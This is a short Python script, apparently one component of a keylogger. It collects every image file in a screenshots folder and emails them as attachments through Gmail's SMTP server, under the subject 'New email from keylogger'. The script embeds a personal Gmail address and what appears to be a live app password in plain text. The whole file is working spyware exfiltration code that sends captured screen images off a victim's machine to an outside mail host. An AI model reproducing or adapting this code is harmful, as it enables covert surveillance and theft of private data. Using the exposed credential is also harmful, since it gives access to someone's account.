import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Setup port number and server name

smtp_port = 587                 # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server

# Set up the email lists
email_from = "yasmineloussayef2019@gmail.com"
email_list = ["yasmineloussayef2019@gmail.com"]

# Define the password (better to reference externally)
pswd = "jean jklf nmmu osna"


# name the email subject
subject = "New email from keylogger"

# Define the folder containing images
image_folder = "./screenshots"

# Function to get the list of image files in the folder
def get_image_files(folder):
    image_files = [f for f in os.listdir(folder) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp'))]
    return image_files

# Function to send emails with image attachments
def send_emails_with_images(email_list):
    for person in email_list:
        body = f"""
        **logs**
        """
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        image_files = get_image_files(image_folder)
        for image_file in image_files:
            image_path = os.path.join(image_folder, image_file)
            with open(image_path, 'rb') as image_attachment:
                attachment_package = MIMEBase('application', 'octet-stream')
                attachment_package.set_payload(image_attachment.read())
                encoders.encode_base64(attachment_package)
                attachment_package.add_header('Content-Disposition', f"attachment; filename= {image_file}")
                msg.attach(attachment_package)
        text = msg.as_string()
        print("Connecting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Successfully connected to the server")
        print()
        print(f"Sending email to: {person}...")
        TIE_server.sendmail(email_from, person, text)
        print(f"Email sent to: {person}")
        print()
    TIE_server.quit()

# Run the function
send_emails_with_images(email_list)
